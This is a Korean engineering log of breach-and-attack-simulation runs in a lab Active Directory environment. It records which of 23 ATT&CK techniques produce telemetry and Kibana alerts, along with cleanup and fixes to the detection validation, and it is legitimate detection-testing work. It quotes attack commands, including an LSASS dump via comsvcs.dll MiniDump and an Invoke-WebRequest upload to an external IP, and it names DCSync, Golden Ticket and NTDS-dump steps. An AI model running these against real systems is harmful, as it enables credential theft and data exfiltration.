사용자 컨텍스트 실행 문제는 해결됐다. 이제 4~8번 Discovery 계열은 `NT AUTHORITY\SYSTEM`이 아니라 `MYCOMPANY\employee1` 컨텍스트로 Sysmon ProcessCreate 이벤트를 남길 수 있다.

다음 검증 대상:

- 4번 Domain Account Discovery
- 5번 Remote System Discovery
- 7번 Network Share Discovery
- 8번 Permission Groups Discovery
- 9번 Kerberoasting TGS Request

특히 9번은 성공하더라도 DC01 Security 4769의 실제 `TargetUserName` / `ServiceName` 필드가 룰과 맞는지 별도 확인해야 한다.

### 2026-05-31 6차 검증

#### 4/5/7/8/9번 사용자 컨텍스트 실행 검증

4, 5, 7, 8, 9번을 함께 실행했다.

결과:

- Operation: `op-20260531-122209-501c9d`
- 상태: completed
- 실행 대상: 4, 5, 7, 8, 9
- Step 상태: 5개 모두 success

ELK deferred check 결과:

| 번호 | Technique | Source telemetry | Alert | 판단 |
| --- | --- | ---: | ---: | --- |
| 4 | T1087.002 Domain Account Discovery | 6 | 6 | 탐지 성공 |
| 5 | T1018 Remote System Discovery | 8 | 2 | 탐지 성공 |
| 7 | T1135 Network Share Discovery | 338 | 1 | 탐지 성공 |
| 8 | T1069 Permission Groups Discovery | 7 | 4 | 탐지 성공 |
| 9 | T1558.003 Kerberoasting | 3 | 0 | 원천 로그는 생성됐지만 alert 미발생 |

Report 요약:

- 최종 점수: 91
- Alert coverage: 0.8
- Telemetry coverage: 1.0
- 남은 gap: 9번 1개

#### 9번 Kerberoasting 상세 확인

9번은 BAS 실행 자체는 성공했고, DC01 Security 4769 원천 이벤트도 생성됐다.

확인된 최신 4769 이벤트:

- Event ID: 4769
- TargetUserName: `employee1@MYCOMPANY.LOCAL`
- ServiceName: `svc_file`
- IpAddress: `::ffff:10.0.4.216`
- TicketEncryptionType: `0x12`
- Status: `0x0`

즉, BAS는 이제 Notion 시나리오와 맞게 `employee1` 사용자 컨텍스트에서 `svc_file` 서비스 티켓 요청 흔적을 만들고 있다.

다만 `.alerts-security.alerts-default`에서 `09.T1558.003` 또는 `T1558.003` 태그 alert는 최근 24시간 기준 확인되지 않았다.

#### 판단

9번은 더 이상 BAS 실행 컨텍스트 문제로 보기 어렵다. 원천 로그가 룰이 기대하던 `employee1` / `svc_file` 형태로 생성됐기 때문에, 미탐 원인은 다음 중 하나일 가능성이 높다.

- 9번 탐지 룰이 비활성화되어 있음
- 룰 schedule/window가 실행 시점과 맞지 않음
- rule query가 실제 필드명 또는 값과 불일치함
- 예외 조건 또는 suppression으로 alert가 생성되지 않음

이 항목은 누나에게 "BAS 원천 로그는 정상 생성됐으나 alert 미발생"으로 전달해야 한다.

### 2026-05-31 7차 검증

#### 10/11번 WinRM 실행 검증

10, 11번을 함께 실행했다.

결과:

- Operation: `op-20260531-122659-fde92f`
- 상태: completed
- 실행 대상: 10, 11
- Step 상태: 2개 모두 success

Step stdout:

- 10번: `FS01`
- 11번: `mycompany\svc_file`

ELK deferred check 결과:

| 번호 | Technique | Source telemetry | Alert | 판단 |
| --- | --- | ---: | ---: | --- |
| 10 | T1021.006 WinRM Remote Execution | 2 | 0 | 원천 로그는 생성됐지만 alert 미발생 |
| 11 | T1059.001 PowerShell over WinRM | 11 | 0 | 원천 로그는 생성됐지만 alert 미발생 |

Report 요약:

- 최종 점수: 58
- Alert coverage: 0
- Telemetry coverage: 1.0
- Critical gaps: 2

#### 10번 원천 로그 상세 확인

FS01 Sysmon Event ID 1 원천 로그에서 다음 이벤트를 확인했다.

- host: FS01
- User: `MYCOMPANY\svc_file`
- Image: `C:\Windows\System32\wsmprovhost.exe`
- ParentImage: `C:\Windows\System32\svchost.exe`
- CommandLine: `C:\Windows\system32\wsmprovhost.exe -Embedding`

이는 10번 WinRM Remote Execution 탐지 룰이 일반적으로 기대하는 핵심 흔적과 일치한다.

#### 11번 원천 로그 상세 확인

FS01 Sysmon Event ID 1 원천 로그에서 다음 이벤트를 확인했다.

- host: FS01
- User: `MYCOMPANY\svc_file`
- Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- ParentImage: `C:\Windows\System32\wsmprovhost.exe`
- CommandLine: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -Command "whoami; Get-Date"`

즉, 11번도 기존 FS01 Agent 직접 실행 문제가 해결됐고, 이제 PC01 -> FS01 WinRM 경로에서 `wsmprovhost.exe -> powershell.exe` 부모/자식 관계가 생성된다.

#### 판단

10/11번도 BAS 실행 경로는 정상화됐다. 현재 alert 미발생은 BAS가 공격 흔적을 못 만든 문제가 아니라, Kibana 룰의 활성화 상태, 실행 주기, time window, 필드 조건, suppression 조건을 확인해야 하는 영역이다.

특히 10번은 과거 alert가 존재했지만 현재 실행 시점 alert가 없었다. 따라서 룰이 과거에는 동작했으나 현재는 schedule/window/suppression/조건 변경 등으로 최신 이벤트를 alert로 승격하지 못했을 가능성이 있다.

### 2026-05-31 현재 남은 작업 재분류

#### BAS 실행 컨텍스트 수정 완료 및 검증 완료

- 4번 T1087.002
- 5번 T1018
- 6번 T1033
- 7번 T1135
- 8번 T1069
- 9번 T1558.003
- 10번 T1021.006
- 11번 T1059.001

#### 안전하게 추가 검증할 대상

- 1번 T1204.002
- 12번 T1105
- 15번 T1074.001
- 16번 T1041
- 17번 T1036.005
- 18번 T1560.001

이 6개는 DC/AD/GPO를 건드리지 않고 검증 가능하다. 단, 12/15/16/17/18은 PC01 -> FS01 WinRM 경로를 사용하므로 FS01에 synthetic 파일과 zip 파일이 생성될 수 있다. 모두 프로젝트용 경로에서 생성/정리되도록 유지해야 한다.

#### 게이트를 열고 신중히 실행할 대상

- 13번 T1003.001 LSASS Dump
- 14번 T1218.011 Rundll32
- 19번 T1003.006 DCSync
- 20번 T1558.001 Golden Ticket
- 21번 T1078.002 Valid Account
- 22번 T1569.002 Service Execution
- 23번 T1003.003 NTDS Dump

이 7개는 발표 시연 전 별도 창을 잡고 단독 실행해야 한다. 특히 19~23은 Attacker Ubuntu에서 도메인 장악 계열 도구를 실행하므로, 전체 23개 일괄 실행보다 개별 실행과 로그 확인이 안전하다.

#### 현재 기준 결론

지금까지 확인된 핵심 문제는 "BAS가 실행하지 못한다"가 아니라 "BAS가 원천 로그를 정상 생성해도 일부 Kibana 룰이 alert로 승격하지 못한다"로 바뀌었다.

따라서 앞으로의 작업은 다음 순서로 진행한다.

1. 1/12/15/16/17/18을 안전하게 추가 검증한다.
2. 각 Technique별 source telemetry와 alert 발생 여부를 분리해서 기록한다.
3. alert가 안 뜨는 항목은 BAS 문제인지 룰 문제인지 근거 로그 기준으로 분류한다.
4. 13/14/19~23은 게이트를 열기 전 위험성과 원복 가능성을 먼저 확인한다.

### 2026-05-31 8차 검증

#### 1/12/15/16/17/18번 안전 검증 결과

남아 있던 안전 실행 대상 6개를 추가로 검증했다.

1번 단독 실행 결과:

- Operation: `op-20260531-123155-80a973`
- 상태: completed
- Step 상태: success
- stdout: `mycompany\employee1`
- Source telemetry: 1
- Alert: 0
- 판단: 사용자 실행 컨텍스트는 정상. alert는 미발생.

12/15/16/17/18번 실행 결과:

- Operation: `op-20260531-123241-f0e5cf`
- 상태: completed
- Step 상태: 5개 모두 success

초기 ELK 결과:

| 번호 | Technique | Source telemetry | Alert | 판단 |
| --- | --- | ---: | ---: | --- |
| 12 | T1105 Ingress Tool Transfer | 1 | 3 | 탐지 성공 |
| 15 | T1074.001 Local Data Staging | 1 | 0 | 원천 로그는 생성됐지만 alert 미발생 |
| 16 | T1041 Exfiltration Over C2 | 0 | 0 | BAS 검증 쿼리와 실행 방식 불일치 |
| 17 | T1036.005 Masquerading | 1 | 0 | 원천 로그는 생성됐지만 alert 미발생 |
| 18 | T1560.001 Archive Collected Data | 0 | 0 | 실행 흔적은 있으나 BAS 검증 쿼리와 불일치 |

#### 16번 T1041 보정

초기 16번은 FS01에서 Attacker로 HTTP POST가 성공했지만 source telemetry가 0이었다.

원인:

- 실제 네트워크 이벤트는 `DestinationIp: 10.0.1.194`로 생성됐다.
- 기존 BAS 검증 쿼리는 `NOT DestinationIp:10.*` 조건을 포함해 내부 VPC IP를 제외했다.
- 따라서 "실행 실패"가 아니라 "내부 VPC Attacker IP를 사용했는데 검증 쿼리는 외부 C2 형태를 기대한 것"이었다.

수정:

- 16번 실행 명령을 Attacker private IP가 아니라 public IP upload endpoint로 전송하도록 변경했다.
- FS01 WinRM runspace 내부에서 직접 `Invoke-WebRequest`를 실행하지 않고, FS01에서 별도 `powershell.exe` 프로세스를 띄워 명령줄에 `Invoke-WebRequest`가 남도록 변경했다.
- BAS source query도 네트워크 이벤트뿐 아니라 `powershell.exe` ProcessCreate와 PowerShell 4104의 `Invoke-WebRequest /upload` 흔적을 원천 로그로 인정하도록 보강했다.

재검증 결과:

- Operation: `op-20260531-124108-7f551c`
- 상태: completed
- Step 상태: success
- Source telemetry: 5
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: FS01
- event.code: 1
- image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- command_line: `Invoke-WebRequest -Uri "http://54.180.55.229:8080/upload" ...`
- user: `MYCOMPANY\svc_file`

판단:

16번은 BAS 실행과 원천 로그 검증이 정상화됐다. alert 미발생은 Kibana 16번 룰 조건 또는 룰 활성화 상태 확인 대상이다.

#### 18번 T1560.001 보정

초기 18번은 zip 파일 생성 자체는 성공했지만 source telemetry가 0이었다.

원인:

- WinRM runspace 내부에서 `Compress-Archive`가 실행되어 기존 BAS query가 기대한 `powershell.exe` 명령줄 또는 `message:*Compress-Archive*` 형태로 잘 잡히지 않았다.
- 다만 FS01에는 `data.zip` FileCreate 이벤트가 생성되어 archive 행위 자체는 존재했다.

수정:

- FS01에서 별도 `powershell.exe` 프로세스를 띄워 `Compress-Archive` 명령줄이 Sysmon Event ID 1에 남도록 변경했다.

재검증 결과:

- Operation: `op-20260531-123842-73ed96`
- 상태: completed
- Step 상태: success
- Source telemetry: 1
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: FS01
- event.code: 1
- image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- command_line: `Compress-Archive -Path ... -DestinationPath ...data.zip -Force`
- user: `MYCOMPANY\svc_file`

판단:

18번은 BAS 실행과 원천 로그 검증이 정상화됐다. alert 미발생은 Kibana 18번 룰 조건 또는 룰 활성화 상태 확인 대상이다.

#### 안전 실행 대상 6개 최종 상태

| 번호 | Technique | 실행 | Source telemetry | Alert | 판단 |
| --- | --- | --- | ---: | ---: | --- |
| 1 | T1204.002 | success | 1 | 0 | BAS 정상, 룰/alert 확인 대상 |
| 12 | T1105 | success | 1 | 3 | 탐지 성공 |
| 15 | T1074.001 | success | 1 | 0 | BAS 정상, 룰/alert 확인 대상 |
| 16 | T1041 | success | 5 | 0 | BAS 정상화 완료, 룰/alert 확인 대상 |
| 17 | T1036.005 | success | 1 | 0 | BAS 정상, 룰/alert 확인 대상 |
| 18 | T1560.001 | success | 1 | 0 | BAS 정상화 완료, 룰/alert 확인 대상 |

#### 현재까지 완료된 BAS 보정 개수

- 사용자 컨텍스트/WinRM 보정 완료: 8개
  - 4, 5, 6, 7, 8, 9, 10, 11
- 안전 실행 대상 검증 완료: 6개
  - 1, 12, 15, 16, 17, 18
- 총 14개 중 14개는 실행 및 source telemetry 기준으로 검증 완료

남은 것은 안전 게이트가 걸린 7개다.

- 13, 14: FS01 credential access 계열. 실행 전 dump 파일 정리 로직을 보강하는 것이 안전하다.
- 19, 20, 21, 22, 23: Attacker Ubuntu에서 도메인 장악 계열 Impacket 실행. 개별 실행과 사전 원복/정리 기준이 필요하다.

### 2026-05-31 9차 수정

#### 13/14번 안전장치 보강

13, 14번은 FS01에서 `rundll32.exe comsvcs.dll MiniDump`를 사용해 LSASS dump 행위를 재현한다. 이 행위는 탐지 검증에는 필요하지만, dump 파일이 남으면 불필요한 민감 파일이 생성될 수 있다.

따라서 실행 전 다음 보강을 적용했다.

- 13번 dump 경로를 변수로 분리
- 14번 dump 경로를 변수로 분리
- `try/finally` 구조로 `rundll32` 실행 후 `Remove-Item` cleanup 수행
- cleanup 전 2초 대기해 Sysmon ProcessAccess/ProcessCreate 이벤트가 남을 시간을 확보
- cleanup은 `-ErrorAction SilentlyContinue`로 처리해 파일이 없어도 실패하지 않게 함

변경 의도:

- 탐지에 필요한 `rundll32.exe -> comsvcs.dll -> lsass.exe` 행위는 유지
- FS01에 LSASS dump 파일을 장시간 남기지 않음
- DC01, AD, GPO, 계정 설정은 변경하지 않음

#### 13/14 실행 가능성

가능성은 높다. 다만 실제 실행은 다음 조건이 맞아야 한다.

- FS01 Agent에 `BAS_ENABLE_CREDENTIAL_TESTS=1` 게이트가 있어야 함
- FS01 Agent가 관리자 권한으로 실행 중이어야 함
- Defender/보안 설정이 comsvcs MiniDump를 차단하지 않아야 함

실패하더라도 VM이 망가지는 유형은 아니다. 다만 dump 생성 시도 자체가 민감 행위이므로 13/14는 반드시 단독 실행하고, 실행 후 FS01 임시 경로에 dump 파일이 남아 있지 않은지 확인한다.

#### 19~23 실행 가능성

19~23은 BAS 스크립트 구조상 Attacker Ubuntu에서 실행되므로 시나리오 경로는 맞다. 다만 도메인 장악 계열이므로 전체 실행보다 개별 검증이 필요하다.

| 번호 | Technique | 실행 가능성 | 위험도 | 메모 |
| --- | --- | --- | --- | --- |
| 19 | T1003.006 DCSync | 가능 | 높음 | DC 설정 변경은 없지만 복제 권한 이벤트 발생 |
| 20 | T1558.001 Golden Ticket | 가능 | 높음 | ccache 존재/유효성 필요 |
| 21 | T1078.002 Valid Account | 가능 | 중간~높음 | DC SMB 접근 이벤트 발생 |
| 22 | T1569.002 Service Execution | 가능 | 높음 | 원격 서비스 생성/실행 흔적 발생 |
| 23 | T1003.003 NTDS Dump | 가능하나 신중 | 매우 높음 | secretsdump 전체 실행은 시간이 걸리고 DC 부하/민감 데이터 생성 가능 |

권장 순서:

1. 13/14를 먼저 단독 검증한다.
2. 19를 단독 검증한다.
3. 20/21을 단독 검증한다.
4. 22는 서비스 생성 흔적과 cleanup 여부를 확인하면서 단독 실행한다.
5. 23은 발표에 꼭 필요할 때만 실행하고, 가능하면 19번 DCSync evidence로 커버한다.

### 2026-05-31 10차 검증

#### FS01 Agent 중복 등록 정리

13번 최초 실행 시 실제 행위가 나가지 않고 `agent_offline`으로 차단됐다.

원인:

- FS01에 BAS Agent 프로세스가 여러 개 떠 있었다.
- 그중 일부가 `campaign_agent_id`, `agent_role` 등 메타데이터 없이 heartbeat를 보내며 정상 FS01 등록 정보를 덮었다.
- Controller에서는 `sbad-fs01-bas-agent`가 online처럼 보이지만 `agent_role: fs01`이 없어 라우팅 대상이 없는 것으로 판단했다.

조치:

- FS01의 BAS Agent 관련 중복 프로세스를 정리했다.
- `C:\SpacebarBAS\start-bas-agent-fs01.cmd` 기준으로 FS01 Agent를 다시 시작했다.
- 재시작 후 FS01 Agent는 다음 메타데이터로 정상 등록됐다.
  - `campaign_agent_id: SB-AD`
  - `agent_role: fs01`
  - `asset_id: fs01`
  - `capabilities: windows, powershell, sysmon, windows_security, credential_test`

이 조치는 BAS Agent 프로세스만 정리한 것이며 FS01의 AD/GPO/서비스 구성은 변경하지 않았다.

#### 13번 T1003.001 LSASS Memory Dump 검증

13번을 단독 실행했다.

결과:

- Operation: `op-20260531-124546-4c3a89`
- 상태: completed
- Step 상태: success
- Source telemetry: 2
- Alert: 1
- Detection status: detected

확인된 source sample:

- host: FS01
- event.code: 10
- event: ProcessAccess
- SourceImage: `C:\Windows\system32\rundll32.exe`
- TargetImage: `C:\Windows\system32\lsass.exe`

추가 확인:

- 실행 후 FS01 임시 경로에 LSASS dump 파일이 남아 있지 않음을 확인했다.
- cleanup 로직이 정상 동작했다.

판단:

13번은 BAS 실행, 원천 로그, alert까지 정상이다.

#### 14번 T1218.011 Rundll32 Proxy Execution 검증

14번을 단독 실행했다.

결과:

- Operation: `op-20260531-124758-46f82c`
- 상태: completed
- Step 상태: success
- Source telemetry: 2
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: FS01
- event.code: 1
- image: `C:\Windows\System32\rundll32.exe`
- command_line: `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump ... bas_t1218_lsass.dmp full`

추가 확인:

- 실행 후 FS01 임시 경로에 LSASS dump 파일이 남아 있지 않음을 확인했다.
- cleanup 로직이 정상 동작했다.

판단:

14번은 BAS 실행과 원천 로그 생성은 정상이다. alert가 없으므로 14번 Kibana 룰은 비활성화, 조건 불일치, schedule/window 문제, 또는 룰 미작성 가능성이 있다.

#### 현재까지 완료 상태

실행/source telemetry 기준으로 정상화된 항목:

- 1
- 4, 5, 6, 7, 8, 9
- 10, 11, 12
- 13, 14
- 15, 16, 17, 18

총 16개가 BAS 실행 또는 source telemetry 기준으로 검증됐다.

남은 gated domain-compromise 항목:

- 19 DCSync
- 20 Golden Ticket
- 21 Valid Account
- 22 Service Execution
- 23 NTDS Dump

이 5개는 Attacker Ubuntu 기반이라 BAS 실행 위치는 시나리오와 맞다. 다만 DC01에 직접 도메인 장악 계열 이벤트를 발생시키므로 개별 실행과 결과 확인이 필요하다.

### 2026-05-31 11차 검증

#### 19번 T1003.006 DCSync 검증

19번을 단독 실행했다.

결과:

- Operation: `op-20260531-125013-407b86`
- 상태: completed
- Step 상태: success
- Source telemetry: 1
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: DC01
- event.code: 4662
- event: Directory Service Access

판단:

19번은 Attacker Ubuntu에서 DC01로 DCSync 계열 요청을 보내고, DC01 원천 로그까지 생성했다. alert가 없으므로 19번 Kibana 룰 조건 또는 rule schedule/window 확인 대상이다.

#### 20번 T1558.001 Golden Ticket 검증

20번을 단독 실행했다.

결과:

- Operation: `op-20260531-125150-2f0cab`
- 상태: completed
- Step 상태: success
- Source telemetry: 3
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: DC01
- event.code: 4769
- event: Kerberos Service Ticket Operations

판단:

20번은 Golden Ticket ccache 기반 Kerberos 서비스 티켓 요청 흔적을 생성했다. alert가 없으므로 20번 Kibana 룰 조건 또는 rule schedule/window 확인 대상이다.

#### 21번 T1078.002 Valid Domain Account Remote Logon 검증

21번을 단독 실행했다.

결과:

- Operation: `op-20260531-125322-48f153`
- 상태: completed
- Step 상태: success
- Source telemetry: 4
- Alert: 1
- Detection status: detected

확인된 source sample:

- host: DC01
- event.code: 4624
- event: Logon

판단:

21번은 BAS 실행, 원천 로그, alert까지 정상이다.

#### 22번 T1569.002 Service Execution 검증

22번을 단독 실행했다.

결과:

- Operation: `op-20260531-125456-7fb7db`
- 상태: completed
- Step 상태: success
- Source telemetry: 1
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: DC01
- event.code: 7045
- event: Service installed

추가 확인:

- 실행 stdout에서 DC01에 임시 서비스 생성, 시작, 중지 흐름이 확인됐다.
- 실행 후 DC01에 임시 서비스가 남아 있지 않았다.
- 실행 후 DC01 `C:\Windows`에 업로드된 임시 exe가 남아 있지 않았다.

판단:

22번은 BAS 실행과 원천 로그 생성, cleanup까지 정상이다. alert가 없으므로 22번 Kibana 룰 조건 또는 rule schedule/window 확인 대상이다.

#### 23번 T1003.003 NTDS Dump 검증

23번을 단독 실행했다.

결과:

- Operation: `op-20260531-125816-1b8643`
- 상태: completed
- Step 상태: success
- Source telemetry: 12
- Alert: 0
- Detection status: logged_only

확인된 source sample:

- host: DC01
- event.code: 4662
- event: Directory Service Access

추가 확인:

- Attacker repo 경로에 secretsdump 관련 산출 파일이 남아 있지 않았다.
- stdout/stderr는 BAS 명령에서 버려지도록 되어 있어 결과물 파일을 생성하지 않는 방식으로 검증했다.

판단:

23번은 BAS 실행과 DC01 원천 로그 생성은 정상이다. alert가 없으므로 23번 전용 룰이 없거나, 현재 19번 DCSync 룰과 중복되는 영역으로 봐야 한다.

#### 19~23 최종 상태

| 번호 | Technique | 실행 | Source telemetry | Alert | 판단 |
| --- | --- | --- | ---: | ---: | --- |
| 19 | T1003.006 DCSync | success | 1 | 0 | BAS 정상, 룰/alert 확인 대상 |
| 20 | T1558.001 Golden Ticket | success | 3 | 0 | BAS 정상, 룰/alert 확인 대상 |
| 21 | T1078.002 Valid Account | success | 4 | 1 | 탐지 성공 |
| 22 | T1569.002 Service Execution | success | 1 | 0 | BAS 정상, 룰/alert 확인 대상 |
| 23 | T1003.003 NTDS Dump | success | 12 | 0 | BAS 정상, 룰/alert 확인 대상 |

#### 전체 23개 기준 최종 판단

현재 BAS는 23개 Technique을 모두 실행 가능하다.

실행 실패 또는 agent 라우팅 문제는 현재 기준으로 없다.

남은 문제는 BAS 실행 문제가 아니라 alert coverage 문제다. 특히 다음 항목은 source telemetry가 생성됐지만 Kibana alert가 발생하지 않았다.

- 1
- 9
- 10
- 11
- 14
- 15
- 16
- 17
- 18
- 19
- 20
- 22
- 23

이 항목들은 누나에게 "BAS가 생성한 원천 로그 샘플과 alert 미발생 사유"를 전달해 룰 활성화, 룰 조건, time window, suppression, 필드명 조건을 확인해야 한다.

반대로 다음 항목은 실제 alert까지 확인됐다.

- 4
- 5
- 7
- 8
- 12
- 13
- 21

6번은 사용자 컨텍스트 검증용 성격이 강하고, 2/3번은 기존 검증에서 탐지 성공했던 항목으로 유지한다.

### 2026-05-31 12차 전체 리허설

#### 웹 대시보드 23개 전체 실행

BAS 웹 대시보드에서 Technique 탭의 23개 Technique을 전체 선택한 뒤 Attack Map Run으로 전체 실행했다.

결과:

- Operation: `op-20260531-130306-c6726d`
- 실행 방식: Real gated
- 전체 단계: 23
- 성공: 23
- 실패: 0
- 차단: 0
- Simulation: 0
- Pending: 0

즉, 현재 BAS는 가현 AD 환경 기준 23개 Technique을 전체 선택 후 일괄 실행할 수 있다.

#### ELK 검증 결과

ELK deferred validation 결과:

- 검증 완료: 23/23
- Detected: 16
- Logged only: 7
- Missed: 0
- Not checked: 0

Technique별 결과:

| 번호 | Technique | 실행 | Source events | Alerts | Detection |
| --- | --- | --- | ---: | ---: | --- |
| 1 | T1204.002 | success | 2 | 0 | logged_only |
| 2 | T1059.003 | success | 28 | 20 | detected |
| 3 | T1095 | success | 5365 | 1487 | detected |
| 4 | T1087.002 | success | 12 | 12 | detected |
| 5 | T1018 | success | 16 | 4 | detected |
| 6 | T1033 | success | 7 | 4 | detected |
| 7 | T1135 | success | 454 | 5 | detected |
| 8 | T1069 | success | 14 | 8 | detected |
| 9 | T1558.003 | success | 22 | 1 | detected |
| 10 | T1021.006 | success | 17 | 10 | detected |
| 11 | T1059.001 | success | 26 | 4 | detected |
| 12 | T1105 | success | 4 | 12 | detected |
| 13 | T1003.001 | success | 8 | 4 | detected |
| 14 | T1218.011 | success | 4 | 0 | logged_only |
| 15 | T1074.001 | success | 3 | 0 | logged_only |
| 16 | T1041 | success | 7 | 0 | logged_only |
| 17 | T1036.005 | success | 3 | 0 | logged_only |
| 18 | T1560.001 | success | 2 | 0 | logged_only |
| 19 | T1003.006 | success | 22 | 21 | detected |
| 20 | T1558.001 | success | 20 | 8 | detected |
| 21 | T1078.002 | success | 20 | 16 | detected |
| 22 | T1569.002 | success | 2 | 1 | detected |
| 23 | T1003.003 | success | 24 | 0 | logged_only |

#### BAS Report 결과

생성된 Report:

- Report ID: `report-op-20260531-130306-c6726d`
- Final score: 87/100
- Execution rate: 100%
- Telemetry coverage: 100%
- Alert coverage: 69.57%
- Detection coverage: 69.57%
- Backlog count: 7
- Critical gaps: 5

Report artifact:

- `outputs/reports/op-20260531-130306-c6726d.report.json`
- `outputs/reports/op-20260531-130306-c6726d.summary.md`
- `outputs/reports/op-20260531-130306-c6726d.summary.html`
- `outputs/reports/op-20260531-130306-c6726d.technical.md`
- `outputs/reports/op-20260531-130306-c6726d.coverage.csv`
- `outputs/reports/op-20260531-130306-c6726d.detection-backlog.csv`
- `outputs/reports/op-20260531-130306-c6726d.attack-navigator.json`

Backlog 대상:

- P1 T1204.002 step 1
- P1 T1218.011 step 14
- P1 T1074.001 step 15
- P1 T1041 step 16
- P1 T1003.003 step 23
- P2 T1036.005 step 17
- P2 T1560.001 step 18

#### Cleanup 확인

전체 실행 후 위험 산출물이 남는지 확인했다.

- FS01 LSASS dump 파일: 남아 있지 않음
- DC01 psexec 임시 서비스: 남아 있지 않음
- DC01 psexec 업로드 exe: 남아 있지 않음

#### UI 관찰 사항

웹 대시보드는 전체 실행 operation을 정상 생성하고 실행할 수 있었다. 다만 실행 완료 후 화면이 자동으로 끝까지 최신화되지 않고, 새로고침 후 최종 결과가 정확히 표시됐다.

관찰:

- 실행 중 화면에서는 중간 단계 이후 상태가 stale하게 보일 수 있음
- 새로고침 후에는 `23 success`, `16 detected`, `7 logged`, `0 missed`가 정상 표시됨

개선 후보:

- operation polling interval/조건 점검
- `elk_validation_status`가 `waiting/running/completed`로 바뀔 때 UI가 계속 polling하도록 수정
- "전체 선택" 후 바로 Run이 아니라 큐 구성 후 Run을 눌러야 하는 UX를 더 명확히 표시

#### 냉정한 최종 판단

발표/시연 기준:

- 충분히 발표 가능하다.
- "BAS로 실제 공격 흐름을 실행하고, ELK에서 source telemetry와 alert coverage를 검증하며, 자동 보고서와 개선 백로그를 생성한다"는 메시지가 성립한다.
- 특히 23개 전체 실행 성공, telemetry coverage 100%, missed 0개는 강한 결과다.

상용 BAS 기준:

- 아직 완성형은 아니다.
- 가장 큰 약점은 source/alert count가 operation 고유 증거와 강하게 묶여 있지 않아 일부 count가 과대 집계될 수 있다는 점이다.
- 예를 들어 3번 T1095, 7번 T1135는 source/alert 건수가 매우 크므로, 현재 lookback window 안의 과거/반복 이벤트가 함께 잡혔을 가능성이 있다.
- 상용 BAS처럼 보이려면 각 Technique 실행마다 operation_id 또는 고유 marker를 남기고, ELK query가 해당 marker 또는 step execution window를 기준으로 결과를 좁혀야 한다.

우선 보완 순서:

1. UI polling stale 문제 수정
2. Report summary에서 backlog 7개가 모두 보이도록 요약/상세 구분 개선
3. 각 Technique에 고유 execution marker 삽입
4. ELK query를 step started_at/finished_at 기준으로 좁히기
5. alert 없는 7개 룰 보완
6. 3번/7번처럼 count가 큰 항목은 query 정밀도 개선

### 2026-05-31 보완 반영: Operation/Step 단위 검증 정밀화

#### 반영한 내용

- 각 Operation step에 `execution_marker`를 부여하도록 수정했다.
- Controller가 Agent Job을 만들 때 `_operation_id`, `_job_id`, `_execution_marker`, `_step_order`를 runtime context로 함께 전달한다.
- Agent가 실행 결과에 runtime context를 남기도록 수정했다.
- Deferred ELK 검증 시 step의 `started_at`/`finished_at`을 기준으로 source/alert 쿼리에 시간 범위를 적용하도록 수정했다.
- 기존처럼 120분 lookback 전체를 보는 방식이 아니라, 기본적으로 step 시작 30초 전부터 step 종료 5분 후까지를 조회한다.
- 프론트엔드는 Operation status가 `completed`가 되어도 `elk_validation_status`가 `waiting`/`running`이면 polling을 계속하도록 수정했다.
- Report summary markdown/html의 개선 백로그는 상위 일부가 아니라 전체 backlog를 표시하도록 수정했다.

#### 기대 효과

- 같은 Technique을 여러 번 실행했을 때 과거 실행 로그가 섞여 source/alert count가 과대 집계되는 문제를 줄일 수 있다.
- 대시보드가 실행 완료 직후 stale 상태로 멈추는 문제를 줄일 수 있다.
- 발표 시 "BAS가 실행한 이번 Operation 기준으로 로그/알림 커버리지를 검증했다"는 설명이 더 안전해진다.

#### 남은 한계

- 모든 탐지 룰이 BAS marker를 직접 참조하는 것은 아니다. 현재 marker는 추적성과 보고서 근거 강화를 위한 메타데이터 성격이 강하다.
- 완전한 상용 BAS 수준으로 가려면 각 Technique 명령에도 marker를 의도적으로 남기고, ELK source query가 marker와 시간 범위를 함께 보도록 고도화해야 한다.
- 일부 alert는 Kibana rule interval 때문에 step 종료 5분 이후에 생성될 수 있으므로 필요 시 `BAS_ELK_WINDOW_AFTER_SECONDS` 값을 조정해야 한다.

### 2026-05-31 추가 보완: Command-Level Marker 자동 주입

#### 반영한 내용

- `sb_ad_technique` 실행 모듈에서 shell별 command-level marker를 자동 주입하도록 수정했다.
- PowerShell 명령에는 `$env:SPACEBAR_BAS_MARKER`와 `Write-Output` 기반 marker를 앞에 붙인다.
- CMD 명령에는 `echo SPACEBAR_BAS_MARKER=... > NUL &` 형태로 marker를 앞에 붙인다.
- Bash 명령에는 `SPACEBAR_BAS_MARKER` 환경변수를 export하고 `/tmp/spacebar-bas-markers.log`에 marker를 남긴다.
- Windows scheduled task executor는 task 이름에도 marker 일부를 포함해 Windows 작업 생성/실행 로그에서 Operation 추적성을 높인다.
- ELK 검증 결과에는 기존 source/alert check와 별도로 `marker_check`를 추가해 marker 문자열이 로그에 남았는지 보조 확인할 수 있게 했다.

#### 판단 기준

- 기존 탐지 룰이 marker를 반드시 봐야 하도록 바꾸지는 않았다.
- 이유는 marker를 필수 조건으로 만들면 실제 공격 행위 기반 탐지 검증이 아니라 BAS 전용 문자열 탐지가 되어버릴 수 있기 때문이다.
- 따라서 marker는 "이번 실행의 증거를 좁히는 보조 수단"으로 사용하고, source/alert 판정은 기존 탐지 룰과 time window를 기준으로 유지한다.

### 현재 BAS 부족한 부분

#### 1. 시나리오 다양성 부족

현재 SB-AD BAS는 23개 Technique을 정해진 시나리오대로 실행한다. 이는 프로젝트 검증에는 충분하지만, 상용 BAS처럼 같은 Technique을 여러 변형으로 반복 검증하는 수준은 아니다.

보완 방향:

- Technique별 variant 추가
- 예: PowerShell 실행 방식, 파일명, 경로, 부모 프로세스, 사용자 계정, 원격 실행 방식 변경
- 같은 탐지 룰이 단일 문자열이 아니라 행위 패턴을 잡는지 검증

#### 2. Prevention 검증 부재

현재는 source telemetry와 Kibana alert 중심이다. 즉 "로그가 남았는가", "알림이 떴는가"를 검증한다.

상용 BAS는 여기에 더해 다음을 분리한다.

